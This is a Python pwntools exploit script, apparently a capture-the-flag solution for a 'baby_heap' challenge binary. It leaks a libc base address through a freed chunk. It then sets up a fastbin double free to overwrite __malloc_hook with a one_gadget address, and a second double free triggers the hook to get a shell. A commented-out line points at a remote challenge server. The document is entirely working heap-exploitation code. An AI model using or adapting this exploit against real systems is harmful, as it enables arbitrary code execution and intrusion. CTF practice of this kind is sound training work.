from pwn import *

def add(size, data):
    global r
    print('add {} {}'.format(hex(size), data))
    r.recvuntil('>')
    r.sendline('1')
    r.recvuntil('Size:')
    r.send(str(size))
    r.recvuntil('Data:')
    r.send(data)

def show(index):
    global r
    print('show {}'.format(index))
    r.recvuntil('>')
    r.sendline('2')
    r.recvuntil('Index :')
    r.sendline(str(index))
    return r.recvline()

def delete(index):
    global r
    print('delete {}'.format(index))
    r.recvuntil('>')
    r.sendline('3')
    r.recvuntil('Index :')
    r.sendline(str(index))

elf = ELF('libc-2.23.so')

r = process('baby_heap')
#r = remote('140.110.112.77', 4008)
raw_input('debug: ')
add(0x100, 'aaaaaaaa')
add(0x68, 'bbbbbbbb')
add(0x68, 'cccccccc')

delete(0)
elf.address = u64(show(0).strip() + '\0\0') - 0x00007fa6ba7eeb78 + 0x00007fa6ba42a000 
print('libc base: {}, __malloc_hook: {}, system: {}'.format(hex(elf.address), hex(elf.symbols['__malloc_hook']), hex(elf.symbols['system'])))

delete(1)
delete(2)
delete(1)

add(0x68, p64(elf.symbols['__malloc_hook'] - 0x10 - 3))
add(0x68, 'no')
add(0x68, 'no')

#add(0x68, 'a' * 3 + p64(elf.symbols['system']))
#r.recvuntil('>')
#r.sendline('1')
#r.recvuntil('Size:')
#r.send(str(elf.search('/bin/sh\0').next()))

# use add() to trigger malloc cannot meet the condition
add(0x68, 'a' * 3 + p64(elf.address + 0xf02a4))
delete(1)
delete(1)

r.interactive()
